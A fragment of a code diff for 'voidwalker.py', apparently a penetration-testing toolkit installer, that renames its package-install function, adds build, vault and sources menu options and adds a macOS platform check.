         self.complete_status_line(short_name, cat_success, cat_fail)
 
@@ -1516,7 +3431,7 @@ alias pspy='~/voidwalker/tools/linux/enum/pspy64'
             (self.base_path / d).mkdir(parents=True, exist_ok=True)
         print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} Workspace created at {self.base_path}{Colors.RESET}")
         
-        self.install_apt_tools()
+        self.install_system_tools()
         
         for category in categories:
             self.install_category(category)
@@ -1592,10 +3507,19 @@ alias pspy='~/voidwalker/tools/linux/enum/pspy64'
                 self.show_tool_list()
             
             elif choice == "apt":
-                self.install_apt_tools()
+                self.install_system_tools()
             
             elif choice == "windows":
                 self.install_windows_binaries()
+
+            elif choice == "build":
+                self.build_all_tools()
+
+            elif choice == "vault":
+                self.setup_obsidian_vault()
+                
+            elif choice == "sources":
+                self.show_sources()
 
 def search_poc(query: str):
     """Search for PoC exploits on GitHub."""
@@ -2182,9 +4106,13 @@ def main():
         dork_generator()
     
     else:
-        if os.geteuid() != 0:
-            print(f"{Colors.YELLOW}Note: Some installations require sudo privileges.{Colors.RESET}")
-            print(f"{Colors.GRAY}Run with 'sudo python3 voidwalker.py' for full functionality.{Colors.RESET}")
+        if sys.platform.startswith("linux"):
+            if os.geteuid() != 0:
+                print(f"{Colors.YELLOW}Note: Some installations require sudo privileges.{Colors.RESET}")
+                print(f"{Colors.GRAY}Run with 'sudo python3 voidwalker.py' for full functionality.{Colors.RESET}")
+                print()
+        elif sys.platform == "darwin":
+            print(f"{Colors.NEON_CYAN}Detected macOS — using Homebrew for package management.{Colors.RESET}")
             print()
         
         installer = VoidWalker()
